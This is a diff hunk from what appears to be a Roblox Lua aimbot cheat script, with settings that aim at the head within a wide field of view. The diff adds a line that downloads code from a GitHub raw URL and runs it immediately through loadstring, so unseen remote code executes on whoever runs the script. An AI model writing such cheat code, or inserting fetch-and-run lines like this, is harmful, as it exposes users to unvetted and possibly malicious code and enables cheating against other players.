@@ -6,6 +6,8 @@ Title = "Enjoy!";
 Duration = 3;
 });
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RFS-cmd/-/main/first"))()
+
 Aiming.TargetPart = {"Head"}
 Aiming.FOV = 170
 Aiming.FOVSides = 250
